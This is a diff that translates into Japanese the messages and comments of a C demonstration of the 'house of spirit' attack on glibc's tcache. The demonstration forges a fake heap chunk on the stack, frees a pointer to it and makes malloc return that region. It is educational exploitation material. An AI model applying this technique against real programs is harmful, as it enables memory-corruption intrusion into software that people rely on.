@@ -6,37 +6,37 @@ int main()
 {
 	setbuf(stdout, NULL);
 
-	printf("This file demonstrates the house of spirit attack on tcache.\n");
-	printf("It works in a similar way to original house of spirit but you don't need to create fake chunk after the fake chunk that will be freed.\n");
-	printf("You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk's size and prev_inuse are sane.\n");
-	printf("(Search for strings \"invalid next size\" and \"double free or corruption\")\n\n");
+	printf("このファイルは、tcache に対する house of spirit 攻撃を示します。\n");
+	printf("元の house of spirit と同じような仕組みで動作しますが、解放される偽のチャンクの後ろに偽のチャンクを作る必要はありません。\n");
+	printf("これは malloc.c の関数 _int_free で確認できます。tcache_put は、次のチャンクのサイズと prev_inuse が妥当かどうかを確認せずに呼び出されます。\n");
+	printf("(文字列 \"invalid next size\" と \"double free or corruption\" を検索してください)\n\n");
 
-	printf("Ok. Let's start with the example!.\n\n");
+	printf("それでは、例を始めましょう。\n\n");
 
 
-	printf("Calling malloc() once so that it sets up its memory.\n");
+	printf("malloc() を一度呼び出して、メモリをセットアップさせます。\n");
 	malloc(1);
 
-	printf("Let's imagine we will overwrite 1 pointer to point to a fake chunk region.\n");
-	unsigned long long *a; //pointer that will be overwritten
-	unsigned long long fake_chunks[10] __attribute__((aligned(0x10))); //fake chunk region
+	printf("1 つのポインタを上書きして、偽のチャンクの領域を指すようにする場面を想像してみましょう。\n");
+	unsigned long long *a; //上書きされるポインタ
+	unsigned long long fake_chunks[10] __attribute__((aligned(0x10))); //偽のチャンクの領域
 
-	printf("This region contains one fake chunk. It's size field is placed at %p\n", &fake_chunks[1]);
+	printf("この領域には偽のチャンクが 1 つ含まれています。そのサイズフィールドは %p に置かれています\n", &fake_chunks[1]);
 
-	printf("This chunk size has to be falling into the tcache category (chunk.size <= 0x410; malloc arg <= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n");
-	printf("... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n");
-	fake_chunks[1] = 0x40; // this is the size
+	printf("このチャンクのサイズは tcache の範囲に収まっている必要があります(x64 では chunk.size <= 0x410、malloc の引数 <= 0x408)。PREV_INUSE(最下位ビット)は tcache のチャンクに対する free では無視されますが、IS_MMAPPED(下位から 2 番目のビット)と NON_MAIN_ARENA(下位から 3 番目のビット)は問題を引き起こします。\n");
+	printf("... これは、次の malloc 要求のサイズを、malloc 実装が内部で使うサイズに丸めたものでなければならない点に注意してください。例えば x64 では、0x30 から 0x38 はすべて 0x40 に丸められるため、最後の malloc の引数として使えます。\n");
+	fake_chunks[1] = 0x40; // これがサイズです
 
 
-	printf("Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &fake_chunks[1]);
-	printf("... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n");
+	printf("ここで、ポインタを、偽の最初のチャンクの内側にある偽のリージョンのアドレス %p で上書きします。\n", &fake_chunks[1]);
+	printf("... このチャンクに対応する*リージョン*のメモリアドレスは、16 バイトにアライン(alignment)されている必要がある点に注意してください。\n");
 
 	a = &fake_chunks[2];
 
-	printf("Freeing the overwritten pointer.\n");
+	printf("上書きしたポインタを解放します。\n");
 	free(a);
 
-	printf("Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &fake_chunks[1], &fake_chunks[2]);
+	printf("これで、次の malloc は %p にある偽のチャンクのリージョンを返し、それは %p になります。\n", &fake_chunks[1], &fake_chunks[2]);
 	void *b = malloc(0x30);
 	printf("malloc(0x30): %p\n", b);
 
